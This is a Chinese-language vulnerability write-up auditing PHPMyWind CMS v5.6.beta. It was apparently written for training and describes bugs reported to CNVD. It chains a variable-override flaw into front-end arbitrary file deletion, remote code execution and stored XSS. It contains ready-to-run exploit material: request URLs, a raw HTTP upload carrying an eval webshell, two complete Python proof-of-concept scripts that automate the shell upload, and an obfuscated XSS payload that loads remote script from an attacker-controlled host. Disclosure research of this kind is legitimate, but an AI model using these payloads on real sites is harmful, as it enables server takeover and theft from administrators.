## **0x01 前言**

为什么写这篇文章，又为什么挖掘到这个CMS的漏洞，其实也是有一些原因的。

最近在给学员做培训，备课到变量覆盖的时候没有什么特别好的例子，随后就想到之前有审计一个CMS叫PHPMyWind，随后我download下来了v5.6.beta版本。

该漏洞已经提交至CNVD，并评分为10.0漏洞评分，如图：

![](https://image.3001.net/images/20220331/1648723235_62458523040a036cba98c.png!small)

##  **0x02 变量覆盖点**

因为在之前我是挖掘过这个CMS的，当时是一个后台的任意文件删除，今天的话算是跟老朋友打交道了，我们看一下咱们变量覆盖点，如图：

![](https://image.3001.net/images/20220331/1648723276_6245854c6fccde37312be.png!small)

这里我们可以看到，存在一个变量覆盖问题，但是却将所有覆盖的变量进行addslashes处理了，也算一种安全机制。

如果仔细观察的话，这里的正则是存在一个缺陷的，如图：

![](https://image.3001.net/images/20220331/1648723321_62458579e4eb9207d8084.png!small)

并没有过滤$_SERVER以及$_FILES，也就是说，我们是可以伪造$_SERVER以及$_FILES的。

##  **0x03 审计思路**

首先我想到的是全局搜索$_FILES，但是这种变量覆盖去覆盖$_FILES是有缺陷的，因为一个$_FILES的变量覆盖的话tmp_name也会随之消失，如图（简单demo）：

> <?php  
> if($_SERVER['REQUEST_METHOD'] == 'GET'){  
> $html = <<<HTML  
> <form action="" method="post" enctype="multipart/form-data">  
> <input type="file" name="file">  
> <input type="submit">  
> </form>  
> HTML;  
> echo $html;  
> }else{  
> extract($_GET);  
> var_dump($_FILES);  
> }

![](https://image.3001.net/images/20220331/1648723370_624585aa2f1d3f1e8bc12.png!small)

如果WEB中使用is_uploaded_file进行判断的话，我们是绕不过这个判断的，因为我们并不知道PHP接收到的临时文件名称是什么。

我们可以看一下该程序员$_FILES处理习惯，如图：

![](https://image.3001.net/images/20220331/1648723398_624585c6a9fd62d2ddae2.png!small)

其实这只是单个文件，其他文件中几乎都会使用is_uploaded_file进行判断然后再上传，那么我们覆盖$_FILES的作用其实也小了很多，因为我们覆盖并无法进行getshell。

然后就是我说的第二个，$_SERVER没有被过滤，在这里很多审计师傅都会想到XXF头注入吧，我们看一下该CMS处理ip的一个方法：

![](https://image.3001.net/images/20220331/1648723424_624585e0c632c90c5033f.png!small)

其实看到这里内心确实是拔凉拔凉的。

##  **0x04 漫长审计之旅**

其实在$_FILES的全局搜索中，我是遇到了一个特别让人眼前一亮的东西，如图：

在data/avatar/lib/Controller/AvatarFlashUpload.php文件中，如图：

![](https://image.3001.net/images/20220331/1648723452_624585fc90f65476052a5.png!small)

其实看到这里的时候，大家会不会觉得，八成已经搞下了，但其实真正的游戏才刚刚开始，我们先梳理起来如何调用到该文件。目前处于一个类中，如图：

![](https://image.3001.net/images/20220331/1648723481_624586194f99b3279707d.png!small)

全局搜索，看哪里实例化了Controller_AvatarFlashUpload类对象，如图：

![](https://image.3001.net/images/20220331/1648723501_6245862d2ff78f29c14a1.png!small)

这样的话我们的upload.php文件就可以作为入口点。路由检查及变量覆盖检查：

![](https://image.3001.net/images/20220331/1648723541_6245865560007b6dcb953.png!small)

那么我们开始一步一步审计。

![](https://image.3001.net/images/20220331/1648723563_6245866b929596998b45b.png!small)

getgpc方法很容易理解，只是获得到$_GET[agent]的值，随后调用到init_input方法中，跟进init_input方法，如图：

![](https://image.3001.net/images/20220331/1648723582_6245867e641cdb4fea06c.png!small)

通过图中的逻辑我们可以知道，该传输使用了类似于dz加密的一种方式，我们必须手上持有Key才可以进行传递任意数据。难道这样就无解了么？答案是否定的。

笔者发现该CMS还有一个AuthCode方法，它处于/include/common.func.php文件之中，如图：

![](https://image.3001.net/images/20220331/1648723602_624586929cc0e3ece7dbc.png!small)

这个方法的加解密逻辑与common::authcode的逻辑是一样的，key也是一致的，发现这个有什么用呢？我们这里可以全局搜索一下谁调用了AuthCode方法，如图：

![](https://image.3001.net/images/20220331/1648723625_624586a90db18af24dd78.png!small)

在shoppingcart.php文件中，有一处AuthCode加密操作，将一个数组进行serialize序列化，随后放入到客户端浏览器Cookie当中，其实这里我们最主要关注的是“$goodsattr”变量，它是可以存放字符串的。

那么我们再转过头来看一下init_input的处理逻辑，如图：

![](https://image.3001.net/images/20220331/1648723644_624586bc0b70ccc1e411e.png!small)

在这里它使用parse_str将$input解密后的值以“key1=value1&key2=value2”分割为一个数组，接下来的一系列操作都是在该数组之上的，那么我们是否可以在shoppingcart.php生成的序列化字符串中进行注入parse_str的解析逻辑？（简单demo）：

> <?php  
> $arr = array(  
> 'test' => $_GET['test']  
> );  
> $data = serialize($arr);  
> parse_str($data, $tester);  
> var_dump($tester);

如图：

![](https://image.3001.net/images/20220331/1648723680_624586e0d28048994221e.png!small)

此时我们就可以注入任意key与value，就达到了伪造$this->input的效果。又因为shoppingcart.php文件需要普通的用户登录才可以使用（购物车功能），那么我们整理攻击逻辑：

![](https://image.3001.net/images/20220331/1648723697_624586f10356de2f4f06e.png!small)

等等，我们待会儿再构造Payload，在这里我们先看一下下面的逻辑：

![](https://image.3001.net/images/20220331/1648723717_624587055592f95e18117.png!small)

其实这里if中的第二个判断条件我们可以直接忽略不计，我们可以通过变量覆盖将$_SERVER[HTTP_USER_AGENT]覆盖为数组，这样的话md5函数会返回空，$agent的结果也是NULL，这里条件就会返回false，就不会进入到exit中。

再往下有一个time，如图：

![](https://image.3001.net/images/20220331/1648723733_62458715dbd8de1bd2a4e.png!small)

这里的话比较简单，因为我们可以恶意注入input中的值，这里我们直接将time赋值为999999999999，避免进入到elseif中的exit函数中。

然后我们可以进行恶意注入$uid，如图：

![](https://image.3001.net/images/20220331/1648723751_62458727b9ebe96f0758f.png!small)

这样的话我们可以完成一个任意文件删除漏洞。

###  **\--- 前台任意文件删除漏洞（CNVD-2022-24939）**

其实进入到unlink函数的思路在上面我们已经说过了，那么我们这里记载一下攻击顺序，首先登录一个普通用户（没有的话注册一个），如图：

![](https://image.3001.net/images/20220331/1648723779_62458743da801929e6f79.png!small)

登录成功之后，访问shoppingcart.php，发送Payload:

shoppingcart.php?a=addshopingcart&goodsid=1&buynum=2&goodsattr=as%26time=999999999999999%26uid=1%26a=1

![](https://image.3001.net/images/20220331/1648723801_624587592d041ed8e9286.png!small)

那么访问upload.php的payload:

?input={ ** **cookie}****
&a=uploadavatar&_SERVER[HTTP_USER_AGENT][]=1&_FILES[Filedata][tmp_name]=../install_lock.txt&_FILES[Filedata][name]=.php

如图：

![](https://image.3001.net/images/20220331/1648723819_6245876ba1cc8d40950e9.png!small)

这样的话，我们成功删除了安装时检查的install_lock.txt文件，访问/install/目录进行安装cms，如图：

![](https://image.3001.net/images/20220331/1648723836_6245877c3fe474491dadf.png!small)

###  **\--- 前台RCE漏洞（CNVD-2022-24937）**

当然了，此时肯定有人喷笔者，你这算是什么RCE，难不成必须让人家网站重装？不着急，我们接着往下看。如图：

![](https://image.3001.net/images/20220331/1648723856_62458790013cbecdf2869.png!small)

这里的话判断处理使用了getimagesize方法，我们看一下该方法处理一个PHP的demo文件会返回什么，如图：

![](https://image.3001.net/images/20220331/1648723872_624587a0005a88f8f74b2.png!small)

这里的话就会返回4个NULL，查看下面的逻辑，如图：

![](https://image.3001.net/images/20220331/1648723886_624587ae78d4542c50111.png!small)

整体逻辑在图中已经解释了，那么我们再来介绍一下getimagesize的width和height如何使用非图片文件进行绕过，如图：

![](https://image.3001.net/images/20220331/1648723901_624587bd85965d6c54490.png!small)

这样的话我们就可以上传一个php文件了，有人又会问了，如果使用define
width这种绕过的话，$type岂不是有数值了？其实这里$type同样会返回null，如图：

![](https://image.3001.net/images/20220331/1648723916_624587ccc60f2d668cb42.png!small)

但是有一个遗憾的点，可能是该程序作者写出来的bug，在下面realpath的函数调用会返回false，如图：

![](https://image.3001.net/images/20220331/1648723932_624587dc15e41121a31c3.png!small)

因为$uid可控，那么我们可以使$uid为1.php，随后调入move_uploaded_file方法。

但是为了防止写到磁盘根目录，这里RCE的话就要符合两种场景中选其一。

### 1：在任意平台下的getshell

这里我们需要开启debug，如图：

我们看一下/include/common.inc.php的error_reporting()的调用，如图：

![](https://image.3001.net/images/20220331/1648723965_624587fdb5e9b04ef9e4e.png!small)

这里config.cache.php文件是后台管理员的配置项，$cfg_diserror默认为Y，这里E_ALL是无法屏蔽warning错误的，所以这里我们就可以利用一些PHP异常信息，函数报错等姿势爆出网站的绝对路径，例如：

Payload: data/avatar/upload.php?_SERVER[HTTP_USER_AGENT][]=1

![](https://image.3001.net/images/20220331/1648723987_6245881353d2f96cc48c5.png!small)

报错原理如下：

![](https://image.3001.net/images/20220331/1648724002_624588227491ee76df516.png!small)

然后我们再往绝对路径下写webshell。

复现过程：

  1. 爆出绝对路径

Payload: data/avatar/upload.php?_SERVER[HTTP_USER_AGENT][]=1

![](https://image.3001.net/images/20220331/1648724019_62458833b0125914b1e5c.png!small)

  1. 获得密钥信息

Payload:shoppingcart.php?a=addshopingcart&goodsid=1&buynum=2&goodsattr=as%26time=999999999999999999%26uid=/../../../刚刚得到的绝对路径\1.php%26a=1

构造HTTP请求如下：

![](https://image.3001.net/images/20220331/1648724054_624588568578029bfe621.png!small)

  1. 构造上传请求

构造HTTP包如下：

> POST
> /data/avatar/upload.php?a=uploadavatar&input=上步骤复制的Cookie信息&_SERVER[HTTP_USER_AGENT][]=1
> HTTP/1.1  
> Host: test1.com  
> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0)
> Gecko/20100101 Firefox/97.0  
> Accept:
> text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8  
> Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
> Accept-Encoding: gzip, deflate  
> Content-Type: multipart/form-data;
> boundary=---------------------------358400350218435578672887741538  
> Content-Length: 289  
> Connection: close  
> Upgrade-Insecure-Requests: 1
>
> \-----------------------------358400350218435578672887741538  
> Content-Disposition: form-data; name="Filedata"; filename="1.png"  
> Content-Type: image/png
>
> <?php  
> eval($_REQUEST['c']);  
> ?>  
> #define width 20  
> #define height 20  
> \-----------------------------358400350218435578672887741538--
如图：

![](https://image.3001.net/images/20220331/1648724090_6245887ac0d9ce2744506.png!small)

如果返回url,则表达文件写入成功，如图：

![](https://image.3001.net/images/20220331/1648724113_6245889152957eb254f52.png!small)编写POC：

> import requests, re
>
> # 配置目标站点  
> url = '目标站点'  
> # member.php中注册用户  
> # 注册完毕手工修改如下cookies  
> cookies = {  
> 'username':'自己配置',  
> 'lastlogintime':'自己配置',  
> 'lastloginip':'自己配置'  
> }  
> def getPath():  
> DebugPath = url + '/data/avatar/upload.php?_SERVER[HTTP_USER_AGENT][]=1'  
> result = requests.get(DebugPath).content.decode('utf-8')  
> try:  
> result = re.findall(' given in <b>(.+?)</b>', result)[0]  
> print('获取路径信息: ' + result)  
> except:  
> print('目标站点未开启DEBUG')  
> exit()  
> return result  
> def getInput(Path):  
> Path = Path.replace('include\common.func.php',
> '').replace('include/common.func.php', '')  
> if ':' in Path:  
> Path = Path[3:]  
> InputUrl = url +
> 'shoppingcart.php?a=addshopingcart&goodsid=1&buynum=2&goodsattr=as%26time=999999999999999999%26uid=/../../../{Path}1.php%26a=1'.format(Path=Path)  
> response = requests.get(InputUrl, cookies=cookies)  
> result = ""  
> try:  
> result = response.headers['Set-Cookie'].split('=')[1]  
> print("获取InputKey: " + result)  
> except:  
> print("Input获取失败...")  
> return result  
> def unlinkInstall(Input):  
> UnlinkUrl = url +
> '/data/avatar/upload.php?a=uploadavatar&input={Input}&_SERVER[HTTP_USER_AGENT][]=1'.format(Input=Input)  
> Data = '''<?php eval($_REQUEST[c]);?>  
> #define width 20  
> #define height 20  
> '''  
> result = requests.post(UnlinkUrl, files={'Filedata':('1.jpg', Data,
> 'image/jpeg')}).content.decode('utf-8')  
> print(result)  
> if 'http://' in result:  
> print('shell上传成功, 路径为：%s/1.php' % (url))  
>  
> if __name__ == '__main__':  
> Path = getPath()  
> Input = getInput(Path)  
> unlinkInstall(Input)

### 2：在Linux平台下的getshell（通吃）

Linux平台不需要报错依赖，直接使用../../../proc/self/cwd/1.php映射到当前工作路径即可。

笔者这里只演示Windows的复现方法，这里的话笔者就直接贴出POC了。

POC:

> import requests, re
>
> # 配置目标站点  
> url = '目标站点'  
> # member.php?c=reg中注册用户  
> # 注册完毕手工修改如下cookies  
> cookies = {  
> 'username':'自己配置cookie',  
> 'lastlogintime':'自己配置cookie',  
> 'lastloginip':'自己配置cookie'  
> }  
> def getInput():  
> InputUrl = url +
> 'shoppingcart.php?a=addshopingcart&goodsid=1&buynum=2&goodsattr=as%26time=999999999999999999%26uid=/../../../proc/self/cwd/1.php%26a=1'  
> response = requests.get(InputUrl, cookies=cookies)  
> result = ""  
> try:  
> result = response.headers['Set-Cookie'].split('=')[1]  
> print("获取InputKey: " + result)  
> except:  
> print("Input获取失败...")  
> return result  
> def unlinkInstall(Input):  
> UnlinkUrl = url +
> '/data/avatar/upload.php?a=uploadavatar&input={Input}&_SERVER[HTTP_USER_AGENT][]=1'.format(Input=Input)  
> Data = '''<?php phpinfo();?>  
> #define width 20  
> #define height 20  
> '''  
> result = requests.post(UnlinkUrl, files={'Filedata':('1.jpg', Data,
> 'image/jpeg')}).content.decode('utf-8')  
> if 'http://' in result:  
> print('shell上传成功, 路径为：%s/data/avatar/1.php' % (url))  
>  
> if __name__ == '__main__':  
> Input = getInput()  
> unlinkInstall(Input)

###  **\--- 前台XSS漏洞（CNVD-2022-24936）**

终于审完前台RCE漏洞，在搜索$_SERVER的途中笔者发现了一个小小的彩蛋，被放入到了INSERT操作中。

![](https://image.3001.net/images/20220331/1648724234_6245890a90b26c3e6c131.png!small)

gethostbyname函数对我们的payload无法造成影响，$_SERVER[REMOTE_ADDR]是可以通过变量覆盖进行伪造的，那么这里就造成了一个未过滤XSS的INSERT操作，还是留言板中。

但是有一个问题，就是message表的ip只可以限定20个字符，如图：

![](https://image.3001.net/images/20220331/1648724250_6245891a2d8851fee58bb.png!small)

其实到这里也是挺麻烦的，因为<script></script>已经十七个字符了，但是后台引入了jQuery，如图：

![](https://image.3001.net/images/20220331/1648724266_6245892a3bb266de0f73e.png!small)

所以这里我们可以通过$.getScript的方式来缩短字符，无论怎样一句话是无法进行远程加载js的，这里的话我想到了多行注释，payload如下（getScript中需要写入你的xss平台接收地址）：

> <script>$./*
>
> */getScript('//x'/*
>
> */%2b'0.nz/auIf')/*
>
> */</script>

通过这种变形拆分，来进行写入js远程加载，如图：

![](https://image.3001.net/images/20220331/1648724297_62458949449beed8690b9.png!small)

依次留言完毕后，我们看一下数据库中的信息，如图：

![](https://image.3001.net/images/20220331/1648724313_62458959480f3cf66a02f.png!small)

这里的话笔者在解释一下为什么需要倒叙插入Payload，在\admin\message.php文件中的SELECT操作，如图：

![](https://image.3001.net/images/20220331/1648724328_6245896844c9ab06e897b.png!small)

看着是没有倒叙的，但其实GetPage方法中，存在SQL语句的封装，如图：

![](https://image.3001.net/images/20220331/1648724343_6245897780fdebc68e13a.png!small)

这里return返回的是倒叙查询结果，那么我们查看留言记录：

![](https://image.3001.net/images/20220331/1648724357_624589859ecf6000c355b.png!small)

这里看着是一条记录，但其实是被我们的多行注释给闭合了，XSS平台接收：

![](https://image.3001.net/images/20220331/1648724371_624589930c901dd39d557.png!small)

##  **0x05 Ending...**

其实整个漏洞的挖掘过程个人感觉还是比较有趣，在前台文件上传中多次运用了CTF的一些知识。

